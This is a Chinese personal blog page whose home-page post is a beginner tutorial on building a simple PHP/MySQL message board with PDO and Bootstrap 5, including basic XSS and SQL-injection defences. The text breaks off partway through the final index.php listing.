<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"x4297.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="开摆!">
<meta property="og:type" content="website">
<meta property="og:title" content="x4297&#39;s blog">
<meta property="og:url" content="https://x4297.github.io/index.html">
<meta property="og:site_name" content="x4297&#39;s blog">
<meta property="og:description" content="开摆!">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="x4297">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://x4297.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>x4297's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">x4297's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录美好生活</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Yuumi.jpg">
      <meta itemprop="name" content="x4297">
      <meta itemprop="description" content="开摆!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="x4297's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/" class="post-title-link" itemprop="url">用php写一个简易留言板</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-01-27 17:37:57 / 修改时间：19:05:08" itemprop="dateCreated datePublished" datetime="2022-01-27T17:37:57+08:00">2022-01-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><b>phpstudy</b></p>
<ul>
<li><p>php 7.3.4</p>
</li>
<li><p>nginx 1.15.11</p>
</li>
<li><p>mysql 5.7.26</p>
</li>
<li><p>bootstrap 5.1.3</p>
</li>
</ul>
<h1 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h1><p>我们需要一个表单，以及展示之前留言的地方</p>
<p>前端不是重点（因为基本不会），所以简单点</p>
<p>表单 form，将数据提交到 ./submit.php 中，前端加几个简单的验证（required表示不能为空）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;./submit.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;label&gt;Name: </span><br><span class="line">            &lt;input name=<span class="string">&quot;name&quot;</span> autocomplete=<span class="string">&quot;name&quot;</span> required=<span class="string">&quot;required&quot;</span>&gt;</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;label&gt;Message: </span><br><span class="line">            &lt;textarea name=<span class="string">&quot;msg&quot;</span> placeholder=<span class="string">&quot;说点什么吧&quot;</span> required=<span class="string">&quot;required&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;/label&gt;</span><br><span class="line">        &lt;button&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>展示留言（要用到数据库，还没写，开发时用静态的数据占位看看效果，下面的是之后改的）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>;</span><br><span class="line">        <span class="variable">$comments</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select name, msg from comments limit 0, 10&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$comments</span>)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$row[&quot;name&quot;]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$row[&quot;msg&quot;]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>



<h1 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h1><p>我们需要用到数据库，最好是整个配置文件单独存放数据库账号密码之类的，写了个类，在静态数据中存放信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;dbms&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dbname&quot;</span> =&gt; <span class="string">&quot;msg_board&quot;</span>,</span><br><span class="line">            <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;port&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h1 id="db-php"><a href="#db-php" class="headerlink" title="db.php"></a>db.php</h1><p>连接数据库， require 配置文件</p>
<p>选择使用 PDO，php数据对象，好处是更换数据库操作系统很方便，如 mysql 换到 sql server之类的（说是这么说，但我也没试过）</p>
<p>{$config[“dbms”]} 官方手册称之为 复杂（花括号）语法，就类似格式化字符串，用$config[“dbms”] 的值替换那一部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line">    <span class="variable">$config</span> = Config::<span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dsn_without_dbname</span> = <span class="string">&quot;<span class="subst">&#123;$config[&quot;dbms&quot;]&#125;</span>:host=<span class="subst">&#123;$config[&quot;host&quot;]&#125;</span>;port=<span class="subst">&#123;$config[&quot;port&quot;]&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$dsn</span> = <span class="variable">$dsn_without_dbname</span> . <span class="string">&quot;;dbname=<span class="subst">&#123;$config[&quot;dbname&quot;]&#125;</span>&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>, <span class="variable">$config</span>[<span class="string">&quot;username&quot;</span>], <span class="variable">$config</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$e</span>-&gt;getCode() === <span class="number">1049</span>)&#123;</span><br><span class="line">            <span class="keyword">require_once</span> <span class="string">&quot;./install.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dsn（php手册里PDO类构造函数第一个参数就是这么命名的）结构大致如下，后面顺序应该可以调换，还有别的字段（我没用上）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql</span>:host=<span class="number">127.0.0.1</span>;port=<span class="number">3306</span>;dbname=msg_board</span><br></pre></td></tr></table></figure>

<p>实例化PDO就代表连接数据库</p>
<p>try catch 是为了在dbms中没有创建指定数据库时，创建对应数据库和表，1049就是数据库不存在对应的错误码</p>
<h1 id="install-php"><a href="#install-php" class="headerlink" title="install.php"></a>install.php</h1><p>创建数据库和表，输出一点提示信息</p>
<p>因为是个简单的留言板，没有登录注册，所以就一张表 id 当主键，自动增加，date 表示添加时间，由 php 代码生成后插入数据库，不用 mysql 内置的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t found database <span class="subst">&#123;$config[&quot;dbname&quot;]&#125;</span>&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start initialization...&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn_without_dbname</span>, <span class="variable">$config</span>[<span class="string">&quot;username&quot;</span>], <span class="variable">$config</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;create database if not exists <span class="subst">&#123;$config[&quot;dbname&quot;]&#125;</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;use <span class="subst">&#123;$config[&quot;dbname&quot;]&#125;</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;create table if not exists `comments`(&quot;</span> .</span><br><span class="line">            <span class="string">&quot;`id` int primary key auto_increment,&quot;</span> .</span><br><span class="line">            <span class="string">&quot;`name` char(50) not null,&quot;</span> .</span><br><span class="line">            <span class="string">&quot;`msg` text not null,&quot;</span> .</span><br><span class="line">            <span class="string">&quot;`date` char(20) not null);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;finished!&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;安装成功&quot;</span>);</span><br></pre></td></tr></table></figure>



<h1 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a>submit.php</h1><p>处理提交的表单</p>
<ul>
<li><p>从超全局变量 $_POST 中获取提交的数据</p>
</li>
<li><p>后端验证，防止数据为空或者太长（前端验证很容易绕过）</p>
</li>
<li><p>htmlspecialchars 使用html实体编码转义一些特殊符号，可以防止 xss 攻击</p>
</li>
<li><p>执行sql语句时，使用 预编译 或者说 参数化查询，可以防止 sql注入</p>
</li>
<li><p>处理完之后在响应头中添加 Location 字段，防止刷新页面导致表单重复提交</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;msg&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$_POST</span>[<span class="string">&quot;msg&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>) &gt; <span class="number">50</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;名称过长&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;名称过长&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>) == <span class="number">0</span> || strlen(<span class="variable">$msg</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;不可为空&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;不可为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$msg</span> = htmlspecialchars(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into comments(name, msg, date)&quot;</span> .</span><br><span class="line">                <span class="string">&quot;values(:name , :msg, :date)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sth</span> = <span class="variable">$db</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$sth</span>-&gt;execute(<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$name</span>, <span class="string">&quot;msg&quot;</span> =&gt; <span class="variable">$msg</span>, <span class="string">&quot;date&quot;</span> =&gt; date(<span class="string">&quot;Y-m-d&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>至此，基本功能差不多实现了，效果如下</p>
<p><img src="/images/13.png"></p>
<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>这界面并不美观，而且没有分页功能</p>
<p>所以再优化一下</p>
<p>不会 css ，所以用 bootstrap 5 降低一点难度</p>
<h1 id="优化后的-index-php"><a href="#优化后的-index-php" class="headerlink" title="优化后的 index.php"></a>优化后的 index.php</h1><p>bootstrap 使用方法就是在标签的 class 中加一些东西，border 、 rounded 这些都代表不同的样式</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-floating container my-5 bg-warning py-5 border rounded&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后加个按钮，之后实现一下翻页功能</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;col-2 text-light btn-primary btn-lg text-center&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">style</span>=<span class="string">&quot;text-decoration: none;&quot;</span> </span></span><br><span class="line"><span class="tag">                        <span class="attr">href</span>=<span class="string">&quot;./more.php?page=1&quot;</span>&gt;</span>more</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一种在php中重复打印 html 文档的方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$comments</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>-<span class="title">striped</span>&quot; <span class="title">style</span>=&quot;<span class="title">word</span>-<span class="title">break</span>:<span class="title">break</span>-<span class="title">all</span>; <span class="title">word</span>-<span class="title">wrap</span>:<span class="title">break</span>-<span class="title">all</span>;&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">font</span>-<span class="title">monospace</span> <span class="title">fw</span>-<span class="title">light</span> <span class="title">fst</span>-<span class="title">italic</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">date</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fs</span>-1 <span class="title">fw</span>-<span class="title">normal</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">name</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">info</span> <span class="title">rounded</span> <span class="title">fs</span>-5 <span class="title">col</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">msg</span>&#x27;] ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用bootstrap前还要导入 css 和 js 文件，我将文件下载到了本地，也可以从 CDN 导入，官方文档中有提供具体的 url</p>
<p>最终代码如下，如果在head中导入js文件，最好加上 defer，可以延迟加载 js 代码。有些js代码需要获取dom中的元素，如果 script 标签放在head中，可能导致 dom 都没加载完就执行 js 代码。还有一种做法是，把 js 代码放在 body 的最底部</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;一个简单的留言板&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;../bootstrap-5.1.3-dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;../bootstrap-5.1.3-dist/js/bootstrap.bundle.min.js&quot;</span> defer=<span class="string">&quot;defer&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">floating</span> <span class="title">container</span> <span class="title">my</span>-5 <span class="title">bg</span>-<span class="title">warning</span> <span class="title">py</span>-5 <span class="title">border</span> <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">action</span>=&quot;./<span class="title">submit</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span 